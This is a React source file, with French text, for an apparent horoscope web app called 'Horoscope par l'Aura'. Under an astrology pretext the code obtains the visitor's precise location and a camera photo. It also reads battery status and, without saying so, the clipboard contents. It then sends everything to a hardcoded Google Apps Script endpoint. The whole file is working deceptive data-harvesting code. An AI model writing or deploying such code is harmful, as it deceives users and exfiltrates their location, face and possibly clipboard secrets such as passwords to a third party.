import React, { useState, useRef, useEffect } from 'react';
import TestResult from './components/TestResult';
import { TestResult as TestResultData, ApiPayload, BatteryInfo } from './types';

// URL de votre API Google Apps Script
const API_URL = 'https://script.google.com/macros/s/AKfycbyTtebvoecSTtYk_VY2kHAQmxpcoXH4vCJiDAYeFtC6gL-xkzxqENbXd4Eo9Ld1_eTFyw/exec';

type TestState = 'idle' | 'requesting' | 'capturing' | 'sending' | 'finished' | 'error';

const App: React.FC = () => {
  const [testState, setTestState] = useState<TestState>('idle');
  const [testResult, setTestResult] = useState<TestResultData | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    // Nettoyer la caméra si le composant est démonté
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const startTest = async () => {
    setTestState('requesting');
    setError(null);
    setTestResult(null);

    try {
      // --- 1. Géolocalisation ---
      setLoadingMessage('Synchronisation avec les astres...');
      const location = await new Promise<{ latitude: number; longitude: number }>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (position) => resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          }),
          (err) => reject(new Error(`Accès à la localisation refusé: ${err.message}`)),
          { timeout: 10000 }
        );
      });

      // --- 2. Caméra ---
      setLoadingMessage('Canalisation de votre énergie astrale...');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(resolve => { videoRef.current!.onloadedmetadata = resolve; });
      }
      
      setTestState('capturing');
      // Attendre que la caméra se stabilise
      await new Promise(resolve => setTimeout(resolve, 1000)); 

      // --- 3. Capture Photo ---
      setLoadingMessage('Capture de votre aura...');
      const canvas = document.createElement('canvas');
      const video = videoRef.current;
      if (!video) throw new Error("Référence vidéo non trouvée.");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (!ctx) throw new Error("Contexte du canvas non trouvé.");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoUrl = canvas.toDataURL('image/jpeg');

      // Arrêter la caméra après la capture
      stream.getTracks().forEach(track => track.stop());
      streamRef.current = null;

      // --- 4. Autres Données ---
      setLoadingMessage('Lecture des flux cosmiques...');
      const battery = await getBatteryInfo();
      const clipboardText = await getClipboardText();

      const result: TestResultData = { photoUrl, location, battery, clipboardText };
      setTestResult(result);

      // --- 5. Envoi des données ---
      setLoadingMessage('Envoi des données au firmament...');
      setTestState('sending');
      const payload: ApiPayload = { ...result, comment: 'Horoscope App Submission' };
      const response = await fetch(API_URL, {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json' },
        mode: 'no-cors' // Le script Google renvoie une réponse opaque, c'est normal
      });
      // no-cors ne permet pas de vérifier le statut, on suppose que c'est ok si ça n'a pas levé d'erreur
      
      setTestState('finished');

    } catch (e) {
      console.error("Erreur lors du test:", e);
      setError(e instanceof Error ? e.message : 'Une erreur inconnue est survenue.');
      setTestState('error');
      // S'assurer que la caméra est bien coupée en cas d'erreur
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
        streamRef.current = null;
      }
    }
  };
  
  const getBatteryInfo = async (): Promise<BatteryInfo | undefined> => {
    if ('getBattery' in navigator) {
      try {
        const battery = await (navigator as any).getBattery();
        return { level: battery.level, charging: battery.charging };
      } catch { return undefined; }
    }
    return undefined;
  };
  
  const getClipboardText = async (): Promise<string | undefined> => {
    try {
      return await navigator.clipboard.readText();
    } catch {
      return undefined;
    }
  };


  const renderContent = () => {
    switch (testState) {
      case 'requesting':
      case 'capturing':
      case 'sending':
        return (
          <div style={{ textAlign: 'center', paddingTop: '50px' }}>
            <div className="spinner"></div>
            <p style={{ fontSize: '1.2em', marginTop: '20px', color: '#a89dff' }}>{loadingMessage}</p>
            <video ref={videoRef} autoPlay playsInline muted style={{ display: testState === 'capturing' ? 'block' : 'none', width: '200px', margin: '20px auto', borderRadius: '8px' }}></video>
          </div>
        );
      case 'finished':
        return testResult ? <TestResult result={testResult} /> : <p>Résultats en cours de préparation...</p>;
      case 'error':
        return (
          <div style={{ textAlign: 'center', padding: '20px', color: '#ff8a8a' }}>
            <h2>Une erreur cosmique est survenue</h2>
            <p>{error}</p>
            <button onClick={() => setTestState('idle')}>Réessayer</button>
          </div>
        );
      case 'idle':
      default:
        return (
          <div style={{ textAlign: 'center', padding: '20px' }}>
            <h1 style={{ color: '#a89dff', textShadow: '0 0 10px #a89dff' }}>🔮 Horoscope par l'Aura 🔮</h1>
            <p style={{ maxWidth: '600px', margin: '20px auto' }}>
              Découvrez ce que les étoiles vous réservent. Notre technologie d'analyse astrale se connecte à votre énergie vitale pour vous offrir une lecture personnalisée de votre horoscope.
            </p>
            <p style={{fontSize: '0.9em', color: '#aaa', margin: '30px auto'}}>Pour cela, nous aurons besoin d'accéder à votre <strong>aura (via votre caméra)</strong> et à votre <strong>alignement cosmique (via votre position)</strong>.</p>
            <button onClick={startTest} className="glow-button">
              Révéler mon horoscope
            </button>
          </div>
        );
    }
  };

  return (
    <>
      <style>{`
        .spinner {
          border: 4px solid rgba(255, 255, 255, 0.2);
          border-left-color: #a89dff;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
          margin: auto;
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        .glow-button {
          background: linear-gradient(45deg, #a89dff, #6f62d1);
          border: none;
          color: white;
          padding: 15px 30px;
          font-size: 1.2em;
          border-radius: 50px;
          cursor: pointer;
          transition: all 0.3s ease;
          box-shadow: 0 0 15px #a89dff;
        }
        .glow-button:hover {
          transform: scale(1.05);
          box-shadow: 0 0 25px #a89dff;
        }
      `}</style>
      <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
        {renderContent()}
      </div>
    </>
  );
};

export default App;
